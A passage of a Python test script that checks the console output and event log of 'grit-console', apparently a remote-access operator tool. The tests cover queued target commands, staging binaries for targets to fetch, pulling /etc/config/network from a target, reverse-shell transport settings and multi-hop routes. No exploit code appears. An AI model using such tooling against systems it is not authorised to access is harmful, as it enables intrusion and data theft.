    queue_result_start = line_console_stdout.find("Command result:", queue_start + 1)
    queue_result_end = line_console_stdout.find("grit[Console Router]/events> queue list", queue_result_start + 1)
    queue_result_text = line_console_stdout[queue_result_start:queue_result_end] if queue_result_start != -1 and queue_result_end != -1 else ""
    clear_command_start = line_console_stdout.rfind("queue clear --confirm")
    clear_start = line_console_stdout.find("cleared ", clear_command_start + 1)
    clear_end = line_console_stdout.find("no queued commands", clear_start + 1)
    clear_text = line_console_stdout[clear_start:clear_end] if clear_start != -1 and clear_end != -1 else ""
    if (not queue_text or "queued cq-" not in queue_text or
            "target: line-console-target (Console Router)" not in queue_text or
            "execution supported: no" not in queue_text or
            "delivery supported: no" not in queue_text or
            "target=" in queue_text or "execution_supported=" in queue_text or
            "delivery_supported=" in queue_text or "headless_command:" in queue_text or
            not queue_result_text or "result: none" not in queue_result_text or
            "waiting for: delivery" not in queue_result_text or
            "result_status=" in queue_result_text or "waiting_for=" in queue_result_text or
            "created=" in queue_result_text or "target=" in queue_result_text or
            not clear_text or "cleared " not in clear_text or "headless_command:" in clear_text):
        print("line-oriented queue commands exposed noisy headless commands", file=sys.stderr)
        print("queue section:", file=sys.stderr)
        print(queue_text or line_console_stdout, file=sys.stderr)
        print("queue result:", file=sys.stderr)
        print(queue_result_text or line_console_stdout, file=sys.stderr)
        print("clear section:", file=sys.stderr)
        print(clear_text or line_console_stdout, file=sys.stderr)
        return 1
    metadata_start = line_console_stdout.find("notes: Rack shelf A")
    metadata_end = line_console_stdout.find("show activity", metadata_start + 1)
    metadata_text = line_console_stdout[metadata_start:metadata_end] if metadata_start != -1 and metadata_end != -1 else ""
    direct_metadata_start = line_console_stdout.find("renamed target: line-console-target")
    direct_metadata_end = line_console_stdout.find("Search results for Console Router", direct_metadata_start + 1)
    direct_metadata_text = line_console_stdout[direct_metadata_start:direct_metadata_end] if direct_metadata_start != -1 and direct_metadata_end != -1 else ""
    if (not metadata_text or
            "aliases: console-alias" not in metadata_text or
            "unset notes for target: line-console-target" not in metadata_text or
            "target: line-console-target (Console Router)" not in metadata_text or
            "target=" in metadata_text or
            "headless_command:" in metadata_text or
            not direct_metadata_text or
            "aliased target: line-console-target" not in direct_metadata_text or
            "label=Console Router" in direct_metadata_text or
            "notes=Console quick note" in direct_metadata_text or
            "aliases=console-alias" in direct_metadata_text or
            "headless_command:" in direct_metadata_text):
        print("line-oriented target metadata commands exposed noisy headless commands", file=sys.stderr)
        print("metadata section:", file=sys.stderr)
        print(metadata_text or line_console_stdout, file=sys.stderr)
        print("direct metadata section:", file=sys.stderr)
        print(direct_metadata_text or line_console_stdout, file=sys.stderr)
        return 1
    job_search_start = line_console_stdout.find("Search results for line-console-job:")
    job_search_end = line_console_stdout.find("grit[all]/jobs> use 1", job_search_start + 1)
    job_search_text = line_console_stdout[job_search_start:job_search_end] if job_search_start != -1 and job_search_end != -1 else ""
    target_search_start = line_console_stdout.find("Search results for Console Router:")
    target_search_end = line_console_stdout.find("grit[Console Router]> mailbox", target_search_start + 1)
    target_search_text = line_console_stdout[target_search_start:target_search_end] if target_search_start != -1 and target_search_end != -1 else ""
    if (not job_search_text or
            "job line-console-job action: package-artifact state: running" not in job_search_text or
            "use command: use job line-console-job" not in job_search_text or
            "action=package-artifact" in job_search_text or
            "command: scripts/grit-console" in job_search_text or
            not target_search_text or
            "use command: use target line-console-target" not in target_search_text or
            "command: scripts/grit-console" in target_search_text):
        print("line-oriented search results exposed generated commands by default", file=sys.stderr)
        print("job search:", file=sys.stderr)
        print(job_search_text or line_console_stdout, file=sys.stderr)
        print("target search:", file=sys.stderr)
        print(target_search_text, file=sys.stderr)
        return 1
    mailbox_start = line_console_stdout.find("grit[Console Router]> mailbox")
    mailbox_help_start = line_console_stdout.find("grit[Console Router]/queue> mailbox ?", mailbox_start + 1)
    mailbox_targets_start = line_console_stdout.find("grit[Console Router]/queue> mailbox targets", mailbox_help_start + 1)
    queue_view_start = line_console_stdout.find("grit[Console Router]/queue> queue", mailbox_targets_start + 1)
    queue_verbose_start = line_console_stdout.find("grit[Console Router]/queue> show queue -v", queue_view_start + 1)
    queue_view_end = queue_verbose_start
    queue_verbose_end = line_console_stdout.find("grit[Console Router]/queue> use 1", queue_verbose_start + 1)
    mailbox_text = line_console_stdout[mailbox_start:mailbox_help_start] if mailbox_start != -1 and mailbox_help_start != -1 else ""
    mailbox_help_text = line_console_stdout[mailbox_help_start:mailbox_targets_start] if mailbox_help_start != -1 and mailbox_targets_start != -1 else ""
    mailbox_targets_text = line_console_stdout[mailbox_targets_start:queue_view_start] if mailbox_targets_start != -1 and queue_view_start != -1 else ""
    queue_view_text = line_console_stdout[queue_view_start:queue_view_end] if queue_view_start != -1 and queue_view_end != -1 else ""
    queue_verbose_text = line_console_stdout[queue_verbose_start:queue_verbose_end] if queue_verbose_start != -1 and queue_verbose_end != -1 else ""
    mailbox_queue_text = mailbox_text + mailbox_targets_text + queue_view_text + queue_verbose_text
    if (not mailbox_text or not mailbox_targets_text or not queue_view_text or not queue_verbose_text or
            "Command queue  (" not in mailbox_text or
            "Target mailbox  (" not in mailbox_targets_text or
            "Command queue  (" in mailbox_targets_text or
            "Queue actions" in mailbox_targets_text or
            "Command queue  (" not in queue_view_text or
            "Review queue" not in queue_view_text or
            "Queue command" not in queue_view_text or
            "Start mailbox listener" not in queue_view_text or
            "policy details:" not in queue_verbose_text or
            "command-queue:" in queue_view_text or
            "allowed_commands=" in mailbox_queue_text or
            "delivery_policy_counts:" in mailbox_queue_text):
        print("line-oriented mailbox/queue view used verbose policy dump", file=sys.stderr)
        print(mailbox_queue_text or line_console_stdout, file=sys.stderr)
        return 1
    if "search result number out of range" in mailbox_queue_text:
        print("line-oriented mailbox/queue view consumed stale numbered results", file=sys.stderr)
        print(mailbox_queue_text, file=sys.stderr)
        return 1
    if (not mailbox_help_text or
            "Help: queue" not in mailbox_help_text or
            "queue COMMAND" not in mailbox_help_text or
            "Help: targets" in mailbox_help_text):
        print("line-oriented mailbox help did not route to queue help", file=sys.stderr)
        print(mailbox_help_text or line_console_stdout, file=sys.stderr)
        return 1
    verbose_policy_markers = ("allowed_commands=", "delivery_policy_counts:", "mode status:")
    if any(marker in line_console_stdout for marker in verbose_policy_markers):
        print("line-oriented console still exposed verbose command queue policy dump", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        return 1
    upload_start = line_console_stdout.find("File staged for target fetch:")
    upload_end = line_console_stdout.find("grit[Console Router]/files> fetch --queue console-upload", upload_start + 1)
    upload_text = line_console_stdout[upload_start:upload_end] if upload_start != -1 and upload_end != -1 else ""
    fetch_start = line_console_stdout.find("Staged fetch command:")
    fetch_end = line_console_stdout.find("grit[Console Router]/files> stop file-service", fetch_start + 1)
    fetch_text = line_console_stdout[fetch_start:fetch_end] if fetch_start != -1 and fetch_end != -1 else ""
    unstage_start = line_console_stdout.find("grit[Console Router]/files> unstage console-upload")
    unstage_end = line_console_stdout.find("grit[Console Router]/files> stagers", unstage_start + 1)
    unstage_text = line_console_stdout[unstage_start:unstage_end] if unstage_start != -1 and unstage_end != -1 else ""
    if (not upload_text or "File staged for target fetch:" not in upload_text or "headless_command:" in upload_text or
            not fetch_text or "Staged fetch command:" not in fetch_text or "headless_command:" in fetch_text or
            not unstage_text or "unstaged console-upload" not in unstage_text or "not staged missing-upload" not in unstage_text or "headless_command:" in unstage_text):
        print("line-oriented file transfer commands exposed noisy headless commands", file=sys.stderr)
        print("upload section:", file=sys.stderr)
        print(upload_text or line_console_stdout, file=sys.stderr)
        print("fetch section:", file=sys.stderr)
        print(fetch_text or line_console_stdout, file=sys.stderr)
        print("unstage section:", file=sys.stderr)
        print(unstage_text or line_console_stdout, file=sys.stderr)
        return 1
    if ("file_service_started=" in upload_text or "file_service_started=" in fetch_text or
            "target_fetch_command=" in upload_text or "target_fetch_command=" in fetch_text or
            "request_name=" in upload_text or "request_name=" in fetch_text or
            "source_path=" in upload_text or "source_path=" in fetch_text or
            "file service:" in upload_text or "file service:" in fetch_text or
            "target=" in fetch_text):
        print("line-oriented file transfer output exposed raw generated-command/status fields", file=sys.stderr)
        print("upload section:", file=sys.stderr)
        print(upload_text or line_console_stdout, file=sys.stderr)
        print("fetch section:", file=sys.stderr)
        print(fetch_text, file=sys.stderr)
        return 1
    download_start = line_console_stdout.find("Target download command:")
    download_end = line_console_stdout.find("grit[Console Router]/files> show mailbox", download_start + 1)
    download_text = line_console_stdout[download_start:download_end] if download_start != -1 and download_end != -1 else ""
    if not download_text or "target path: /etc/config/network" not in download_text or "headless_command:" in download_text:
        print("line-oriented download command exposed noisy headless command", file=sys.stderr)
        print(download_text or line_console_stdout, file=sys.stderr)
        return 1
    if "target command: ./grit put /etc/config/network" not in download_text:
        print("line-oriented download output missed target command summary", file=sys.stderr)
        print(download_text or line_console_stdout, file=sys.stderr)
        return 1
    if ("file_service_started=" in download_text or "target_command=" in download_text or
            "target_upload_path=" in download_text or "file service:" in download_text or
            "target=" in download_text):
        print("line-oriented download output exposed raw generated-command/status fields", file=sys.stderr)
        print(download_text or line_console_stdout, file=sys.stderr)
        return 1
    binary_end = line_console_stdout.find("Artifact trailer configured:")
    binary_start = line_console_stdout.rfind("griTTYkit binary staged for target fetch:", 0, binary_end)
    binary_text = line_console_stdout[binary_start:binary_end] if binary_start != -1 and binary_end != -1 else ""
    if not binary_text or "run hint: chmod +x ./grit-console && ./grit-console --help" not in binary_text or "headless_command:" in binary_text:
        print("line-oriented serve-binary command exposed noisy headless command", file=sys.stderr)
        print(binary_text or line_console_stdout, file=sys.stderr)
        return 1
    if ("file_service_started=" in binary_text or "target_fetch_command=" in binary_text or
            "target_run_hint=" in binary_text or "request_name=" in binary_text or
            "source_path=" in binary_text or "file service:" in binary_text):
        print("line-oriented serve-binary output exposed raw generated-command/status fields", file=sys.stderr)
        print(binary_text or line_console_stdout, file=sys.stderr)
        return 1
    configure_start = line_console_stdout.find("Artifact trailer configured:")
    configure_end = line_console_stdout.find("grit[Console Router]/files> stop file-service", configure_start + 1)
    configure_text = line_console_stdout[configure_start:configure_end] if configure_start != -1 and configure_end != -1 else ""
    if (not configure_text or
            "artifact: " not in configure_text or
            "name: grit-console" not in configure_text or
            "target fetch: grit fetch grit-console" not in configure_text or
            "keys: GRIT_OPERATOR_SERVER_HOST, GRIT_RSHELL_TRANSPORT, GRIT_ZERO_ARG_MODE, GRIT_COMMAND_QUEUE_ENABLE, GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC" not in configure_text or
            "headless_command:" in configure_text or
            "artifact=" in configure_text or
            "request_name=" in configure_text or
            "keys=" in configure_text or
            "target_fetch_command=" in configure_text):
        print("line-oriented configure command exposed noisy headless command", file=sys.stderr)
        print(configure_text or line_console_stdout, file=sys.stderr)
        return 1
    stagers_start = line_console_stdout.find("grit[Console Router]/files> show stagers")
    stagers_end = line_console_stdout.find("grit[Console Router]/files> unstage console-upload", stagers_start + 1)
    stagers_text = line_console_stdout[stagers_start:stagers_end] if stagers_start != -1 and stagers_end != -1 else ""
    if (not stagers_text or
            "Files  (" not in stagers_text or
            "next: fetch console-upload" not in stagers_text or
            "next: fetch grit-console" not in stagers_text or
            "target_fetch_command=" in stagers_text or
            "target command:" in stagers_text or
            "headless_command:" in stagers_text):
        print("line-oriented files view exposed noisy fetch commands", file=sys.stderr)
        print(stagers_text or line_console_stdout, file=sys.stderr)
        return 1
    daemon_action_start = line_console_stdout.find("grit[all]/jobs> daemon status --dry-run")
    daemon_action_end = line_console_stdout.find("grit[all]> uselistener", daemon_action_start + 1)
    daemon_action_text = line_console_stdout[daemon_action_start:daemon_action_end] if daemon_action_start != -1 and daemon_action_end != -1 else ""
    if (not daemon_action_text or
            "operator daemon workflow action: operator-daemon-status" not in daemon_action_text or
            "daemon action complete: ok" not in daemon_action_text or
            "daemon_workflow_returncode=" in daemon_action_text or
            "headless_command:" in daemon_action_text or
            "headless_command=" in daemon_action_text):
        print("line-oriented daemon action commands exposed noisy headless commands", file=sys.stderr)
        print(daemon_action_text or line_console_stdout, file=sys.stderr)
        return 1
    module_action_start = line_console_stdout.find("grit[all]/action/operator-daemon-status> check")
    module_action_end = line_console_stdout.find("grit[all]> run -j", module_action_start + 1)
    module_action_text = line_console_stdout[module_action_start:module_action_end] if module_action_start != -1 and module_action_end != -1 else ""
    if (not module_action_text or
            "operator daemon workflow action: operator-daemon-status" not in module_action_text or
            "action complete: ok" not in module_action_text or
            "action_returncode=" in module_action_text or
            "headless_command:" in module_action_text or
            "headless_command=" in module_action_text):
        print("line-oriented selected daemon action commands exposed noisy headless commands", file=sys.stderr)
        print(module_action_text or line_console_stdout, file=sys.stderr)
        return 1
    path_view_start = line_console_stdout.find("grit[all]/sessions> interact 1")
    path_view_end = line_console_stdout.find("grit[all]/sessions> use session 1", path_view_start + 1)
    path_view_text = line_console_stdout[path_view_start:path_view_end] if path_view_start != -1 and path_view_end != -1 else ""
    if (not path_view_text or
            "session log:" not in path_view_text or
            "event log:" not in path_view_text or
            "view: view " not in path_view_text or
            "view: scripts/grit-console --config" in path_view_text or
            "session_log=" in path_view_text or
            "event_log=" in path_view_text or
            "headless_command:" in path_view_text):
        print("line-oriented session interaction exposed noisy generated command or raw fields", file=sys.stderr)
        print(path_view_text or line_console_stdout, file=sys.stderr)
        return 1
    session_info_start = line_console_stdout.find("grit[all]/session/20260101T000000-file-service> info")
    session_info_end = line_console_stdout.find("grit[all]/session/20260101T000000-file-service> options", session_info_start + 1)
    session_info_text = line_console_stdout[session_info_start:session_info_end] if session_info_start != -1 and session_info_end != -1 else ""
    session_options_start = line_console_stdout.find("grit[all]/session/20260101T000000-file-service> options")
    session_options_end = line_console_stdout.find("grit[all]/session/20260101T000000-file-service> next", session_options_start + 1)
    session_options_text = line_console_stdout[session_options_start:session_options_end] if session_options_start != -1 and session_options_end != -1 else ""
    if (not session_info_text or
            "Session: 20260101T000000-file-service" not in session_info_text or
            "session log:" not in session_info_text or
            "event log:" not in session_info_text or
            "session=" in session_info_text or
            "service=" in session_info_text or
            "session_log=" in session_info_text or
            "event_log=" in session_info_text or
            "view=scripts/grit-console --config" in session_info_text or
            not session_options_text or
            "Session: 20260101T000000-file-service" not in session_options_text or
            "session log:" not in session_options_text or
            "event log:" not in session_options_text or
            "session.id=" in session_options_text or
            "session.service=" in session_options_text or
            "session.session_log=" in session_options_text or
            "session.event_log=" in session_options_text or
            "session.view_command=scripts/grit-console --config" in session_options_text):
        print("line-oriented selected session context exposed generated view command by default", file=sys.stderr)
        print("session info:", file=sys.stderr)
        print(session_info_text or line_console_stdout, file=sys.stderr)
        print("session options:", file=sys.stderr)
        print(session_options_text, file=sys.stderr)
        return 1
    daemon_start = line_console_stdout.find("grit[all]/routes> daemon")
    daemon_verbose_start = line_console_stdout.find("grit[all]/daemon> daemon -v", daemon_start + 1)
    daemon_plain_text = line_console_stdout[daemon_start:daemon_verbose_start] if daemon_start != -1 and daemon_verbose_start != -1 else ""
    daemon_verbose_text = line_console_stdout[daemon_verbose_start:] if daemon_verbose_start != -1 else ""
    if (not daemon_plain_text or
            "Daemon actions" not in daemon_plain_text or
            "Start operator daemon" not in daemon_plain_text or
            "Check operator daemon" not in daemon_plain_text or
            "operator-daemon-status" in daemon_plain_text or
            "\n     run: scripts/grit-console" in daemon_plain_text or
            "\n     dry-run: scripts/grit-console" in daemon_plain_text or
            "daemon -v for commands" not in daemon_plain_text or
            "\n     id: operator-daemon-status" not in daemon_verbose_text or
            "\n     run: scripts/grit-console" not in daemon_verbose_text or
            "\n     dry-run: scripts/grit-console" not in daemon_verbose_text):
        print("line-oriented console daemon output did not stay concise by default", file=sys.stderr)
        print("plain daemon section:", file=sys.stderr)
        print(daemon_plain_text, file=sys.stderr)
        print("verbose daemon section:", file=sys.stderr)
        print(daemon_verbose_text[:4000], file=sys.stderr)
        return 1
    jobs_verbose_start = line_console_stdout.find("grit[all]/jobs> jobs -v")
    jobs_verbose_end = line_console_stdout.find("grit[all]/jobs> jobs -i 1", jobs_verbose_start + 1)
    jobs_verbose_text = line_console_stdout[jobs_verbose_start:jobs_verbose_end] if jobs_verbose_start != -1 and jobs_verbose_end != -1 else ""
    job_info_start = line_console_stdout.find("grit[all]/job/line-console-job> info")
    job_info_end = line_console_stdout.find("grit[all]/job/line-console-job> options", job_info_start + 1)
    job_info_text = line_console_stdout[job_info_start:job_info_end] if job_info_start != -1 and job_info_end != -1 else ""
    job_options_start = line_console_stdout.find("grit[all]/job/line-console-job> options")
    job_options_end = line_console_stdout.find("grit[all]/job/line-console-job> next", job_options_start + 1)
    job_options_text = line_console_stdout[job_options_start:job_options_end] if job_options_start != -1 and job_options_end != -1 else ""
    job_next_start = line_console_stdout.find("grit[all]/job/line-console-job> next")
    job_next_end = line_console_stdout.find("grit[all]/job/line-console-job> back", job_next_start + 1)
    job_next_text = line_console_stdout[job_next_start:job_next_end] if job_next_start != -1 and job_next_end != -1 else ""
    if (not jobs_verbose_text or
            "cancel: scripts/grit-console" not in jobs_verbose_text or
            not job_info_text or
            "Job: line-console-job" not in job_info_text or
            "action: package-artifact" not in job_info_text or
            "state: running" not in job_info_text or
            "cancel supported:" not in job_info_text or
            "job=" in job_info_text or
            "action=" in job_info_text or
            "cancel_supported=" in job_info_text or
            "cancel=scripts/grit-console" in job_info_text or
            not job_options_text or
            "Job: line-console-job" not in job_options_text or
            "action: package-artifact" not in job_options_text or
            "state: running" not in job_options_text or
            "job.id=" in job_options_text or
            "job.action=" in job_options_text or
            "job.log_path=" in job_options_text or
            "job.cancel_command=scripts/grit-console" in job_options_text or
            not job_next_text or
            "  context: grit[all]/job/line-console-job>" not in job_next_text or
            "  selected job: line-console-job" not in job_next_text or
            "  action: package-artifact" not in job_next_text or
            "  state: running" not in job_next_text or
            "context=" in job_next_text or
            "selected job=" in job_next_text or
            "action=" in job_next_text):
        print("line-oriented selected job context exposed generated cancel command by default", file=sys.stderr)
        print("jobs -v:", file=sys.stderr)
        print(jobs_verbose_text or line_console_stdout, file=sys.stderr)
        print("job info:", file=sys.stderr)
        print(job_info_text, file=sys.stderr)
        print("job options:", file=sys.stderr)
        print(job_options_text, file=sys.stderr)
        print("job next:", file=sys.stderr)
        print(job_next_text, file=sys.stderr)
        return 1
    collection_prompt_expectations = [
        "grit[all]/build> build -v",
        "grit[all]/build> listeners",
        "grit[all]/listeners> listeners -v",
        "grit[all]/routes> route start 2",
        "grit[Console Router]/queue> mailbox targets",
        "grit[Console Router]/queue> queue",
        "grit[Console Router]/files> fetch --queue console-upload",
        "grit[Console Router]/files> show stagers",
        "grit[all]/daemon> daemon -v",
        "grit[all]/jobs> jobs -v",
    ]
    missing_collection_prompts = [
        expected for expected in collection_prompt_expectations
        if expected not in line_console_stdout
    ]
    if missing_collection_prompts:
        print("line-oriented collection commands did not keep collection breadcrumbs", file=sys.stderr)
        for expected in missing_collection_prompts:
            print(f"missing: {expected}", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        return 1
    line_console_makerc_text = line_console_makerc.read_text(encoding="utf-8") if line_console_makerc.exists() else ""
    if (not line_console_makerc.is_file() or
            f"resource {line_console_resource}" not in line_console_makerc_text or
            "makerc " in line_console_makerc_text):
        print("line-oriented console makerc did not save a replayable resource script", file=sys.stderr)
        print(line_console_makerc_text or "missing", file=sys.stderr)
        return 1
    line_console_status = subprocess.run(
        [
            str(server),
            "--config", str(upload_cfg),
            "--state-file", str(line_console_state),
            "--staged-file", str(line_console_staged),
            "--json-status",
        ],
        cwd=ROOT,
        text=True,
        capture_output=True,
    )
    if line_console_status.returncode != 0:
        print("line console status failed", file=sys.stderr)
        print(line_console_status.stdout, file=sys.stderr)
        print(line_console_status.stderr, file=sys.stderr)
        return 1
    line_console_status_doc = json.loads(line_console_status.stdout)
    line_console_events = [
        json.loads(line)
        for line in Path(line_console_status_doc.get("event_log", "")).read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]
    if (line_console_status_doc.get("server_state", {}).get("services", {}).get("workbench", {}).get("selected_target_id", "") != "" or
            not any(event.get("event") == "workbench_target_selected" and (event.get("details") or {}).get("target_id") == "line-console-target" for event in line_console_events) or
            not any(event.get("event") == "workbench_target_filter_cleared" for event in line_console_events) or
            not any(event.get("event") == "workbench_target_interaction_viewed" and (event.get("details") or {}).get("target_id") == "line-console-target" for event in line_console_events) or
            not any(event.get("event") == "workbench_session_selected" and (event.get("details") or {}).get("session_id") == line_console_session.name for event in line_console_events) or
            not any(event.get("event") == "workbench_session_interaction_viewed" and (event.get("details") or {}).get("session_id") == line_console_session.name for event in line_console_events) or
            not any(event.get("event") == "workbench_path_viewed" and (event.get("details") or {}).get("path") == str(line_console_session / "session.log") and (event.get("details") or {}).get("viewable") is True for event in line_console_events) or
            not any(event.get("event") == "workbench_sessions_listed" and (event.get("details") or {}).get("verbose") is True for event in line_console_events) or
            not any(event.get("event") == "workbench_job_selected" and (event.get("details") or {}).get("job_id") == "line-console-job" for event in line_console_events) or
            not any(event.get("event") == "workbench_jobs_listed" and (event.get("details") or {}).get("verbose") is True for event in line_console_events) or
            not any(event.get("event") == "operator_daemon_workflow_action_dry_run" and (event.get("details") or {}).get("id") == "operator-daemon-status" for event in line_console_events) or
            not any(event.get("event") == "workbench_config_updated" and (event.get("details") or {}).get("key") == "GRIT_RUNTIME_ROOT" and (event.get("details") or {}).get("new_value") == "/tmp/grit-global" for event in line_console_events) or
            not any(event.get("event") == "workbench_config_updated" and (event.get("details") or {}).get("key") == "GRIT_RUNTIME_ROOT" and (event.get("details") or {}).get("new_value") == "/tmp/grit-build" for event in line_console_events) or
            not any(event.get("event") == "workbench_config_unset" and (event.get("details") or {}).get("key") == "GRIT_RUNTIME_ROOT" for event in line_console_events) or
            not any(event.get("event") == "workbench_build_config_listed" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_resource_loaded" and (event.get("details") or {}).get("path") == str(line_console_resource) and (event.get("details") or {}).get("command_count") == 3 for event in line_console_events) or
            not any(event.get("event") == "workbench_console_makerc_saved" and (event.get("details") or {}).get("path") == str(line_console_makerc) and (event.get("details") or {}).get("command_count", 0) >= 20 for event in line_console_events) or
            not any(event.get("event") == "workbench_console_completions_shown" and (event.get("details") or {}).get("prefix") == "use job" for event in line_console_events) or
            not any(event.get("event") == "workbench_events_viewed" and (event.get("details") or {}).get("limit") == 3 for event in line_console_events) or
            not any(event.get("event") == "workbench_events_viewed" and (event.get("details") or {}).get("filters", {}).get("service") == "workbench" and (event.get("details") or {}).get("limit") == 2 for event in line_console_events) or
            not any(event.get("event") == "workbench_generated_commands_listed" and (event.get("details") or {}).get("command_count", 0) >= 1 for event in line_console_events) or
            not any(event.get("event") == "target_command_copied" and (event.get("details") or {}).get("ordinal") == 1 for event in line_console_events) or
            not any(event.get("event") == "workbench_bridge_profile_saved" and (event.get("details") or {}).get("name") == "zz-console-added" and (event.get("details") or {}).get("multi_hop") is True for event in line_console_events) or
            not any(event.get("event") == "workbench_route_started" and (event.get("details") or {}).get("name") == "zz-console-added" for event in line_console_events) or
            not any(event.get("event") == "workbench_route_stopped" and (event.get("details") or {}).get("name") == "zz-console-added" for event in line_console_events) or
            not any(event.get("event") == "workbench_route_deleted" and (event.get("details") or {}).get("name") == "zz-console-added" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_modules_listed" and (event.get("details") or {}).get("filter") == "daemon" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_modules_listed" and (event.get("details") or {}).get("filter") == "file-service" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_module_categories_listed" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_modules_listed" and (event.get("details") or {}).get("kind") == "service" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_modules_listed" and (event.get("details") or {}).get("kind") == "daemon" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_modules_listed" and (event.get("details") or {}).get("kind") == "target" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_modules_listed" and (event.get("details") or {}).get("kind") == "workbench" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_alias_used" and (event.get("details") or {}).get("alias") == "usemodule" and (event.get("details") or {}).get("canonical") == "use module" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_alias_used" and (event.get("details") or {}).get("alias") == "execute" and (event.get("details") or {}).get("canonical") == "run" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_alias_used" and (event.get("details") or {}).get("alias") == "uselistener" and (event.get("details") or {}).get("canonical") == "use listener" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_alias_used" and (event.get("details") or {}).get("alias") == "useroute" and (event.get("details") or {}).get("canonical") == "use route" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_alias_used" and (event.get("details") or {}).get("alias") == "usesession" and (event.get("details") or {}).get("canonical") == "use session" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_alias_used" and (event.get("details") or {}).get("alias") == "useagent" and (event.get("details") or {}).get("canonical") == "use agent" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_next_shown" and (event.get("details") or {}).get("module") == "root" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_next_shown" and (event.get("details") or {}).get("module") == "route/console-route" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_next_shown" and (event.get("details") or {}).get("module") == "action/operator-daemon-status" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_main_selected" and (event.get("details") or {}).get("cleared_target") is True for event in line_console_events) or
            not any(event.get("event") == "workbench_listeners_listed" and (event.get("details") or {}).get("verbose") is True for event in line_console_events) or
            not any(event.get("event") == "workbench_routes_listed" and (event.get("details") or {}).get("verbose") is True for event in line_console_events) or
            not any(event.get("event") == "workbench_route_selected" and (event.get("details") or {}).get("name") == "console-route" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_searched" and (event.get("details") or {}).get("query") == "name=file-service" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_searched" and (event.get("details") or {}).get("query") == "line-console-job" for event in line_console_events) or
            not any(event.get("event") == "workbench_console_searched" and (event.get("details") or {}).get("query") == "Console Router" for event in line_console_events) or
            not any(event.get("event") == "target_label_set" and (event.get("details") or {}).get("target_id") == "line-console-target" and "console-alias" in ((event.get("details") or {}).get("aliases") or []) for event in line_console_events) or
            not any(event.get("event") == "workbench_target_metadata_updated" and (event.get("details") or {}).get("target_id") == "line-console-target" and "--set-target-label" in ((event.get("details") or {}).get("headless_command") or "") for event in line_console_events) or
            not any(event.get("event") == "command_queue_queued" and (event.get("details") or {}).get("target_id") == "line-console-target" for event in line_console_events) or
            not any(event.get("event") == "workbench_command_queued" and (event.get("details") or {}).get("target_id") == "line-console-target" and "--queue-command" in ((event.get("details") or {}).get("headless_command") or "") for event in line_console_events) or
            not any(event.get("event") == "workbench_command_result_inspected" and (event.get("details") or {}).get("target_id") == "line-console-target" and (event.get("details") or {}).get("has_result") is False for event in line_console_events) or
            not any(event.get("event") == "workbench_command_queue_cleared" and (event.get("details") or {}).get("count", 0) >= 1 for event in line_console_events) or
            not any(event.get("event") == "workbench_probe_command_shown" and (event.get("details") or {}).get("target_id") == "line-console-target" and (event.get("details") or {}).get("queued") is True for event in line_console_events) or
            not any(event.get("event") == "workbench_target_download_command_shown" and (event.get("details") or {}).get("target_id") == "line-console-target" and (event.get("details") or {}).get("target_upload_path") == "/etc/config/network" and (event.get("details") or {}).get("queued") is True for event in line_console_events) or
            not any(event.get("event") == "workbench_staged_fetch_command_shown" and (event.get("details") or {}).get("target_id") == "line-console-target" and (event.get("details") or {}).get("request_name") == "console-upload" and (event.get("details") or {}).get("queued") is True for event in line_console_events) or
            len([event for event in line_console_events if event.get("event") == "workbench_command_queue_inspected"]) < 2 or
            not any(
                event.get("event") == "workbench_file_uploaded" and
                (event.get("details") or {}).get("request_name") == "console-upload" and
                (event.get("details") or {}).get("target_id") == "line-console-target" and
                (event.get("details") or {}).get("started_file_service") is True
                for event in line_console_events) or
            not any(
                event.get("event") == "workbench_file_unstaged" and
                (event.get("details") or {}).get("request_name") == "console-upload" and
                (event.get("details") or {}).get("existed") is True
                for event in line_console_events) or
            not any(
                event.get("event") == "workbench_binary_served" and
                (event.get("details") or {}).get("request_name") == "grit-console" and
                (event.get("details") or {}).get("target_id") == "line-console-target" and
                (event.get("details") or {}).get("target_label") == "Console Router" and
                (event.get("details") or {}).get("started_file_service") is True
                for event in line_console_events) or
            not any(
                event.get("event") == "workbench_artifact_trailer_configured" and
                (event.get("details") or {}).get("request_name") == "grit-console" and
                "GRIT_OPERATOR_SERVER_HOST" in ((event.get("details") or {}).get("keys") or []) and
                "GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC" in ((event.get("details") or {}).get("keys") or [])
                for event in line_console_events)):
        print("line-oriented console commands did not record expected events", file=sys.stderr)
        print(json.dumps(line_console_status_doc, indent=2, sort_keys=True), file=sys.stderr)
        return 1

    line_console_staged_doc = json.loads(line_console_staged.read_text(encoding="utf-8"))
    configured_binary = (line_console_staged_doc.get("staged") or {}).get("grit-console") or {}
    configured_path = Path(configured_binary.get("source_path") or "")
    configured_from = configured_binary.get("configured_from_source_path") or ""
    if (configured_binary.get("configured") is not True or
            "configured-artifacts" not in str(configured_path) or
            configured_from != str(line_console_binary) or
            not configured_path.is_file()):
        print("line-oriented console did not keep a configured staged binary copy", file=sys.stderr)
        print(json.dumps(configured_binary, indent=2, sort_keys=True), file=sys.stderr)
        return 1
    configured_show = run("scripts/lib/artifact-config", "show", str(configured_path))
    if (configured_show.returncode != 0 or
            "GRIT_OPERATOR_SERVER_HOST=192.0.2.44" not in configured_show.stdout or
            "GRIT_RSHELL_TRANSPORT=builtin" not in configured_show.stdout or
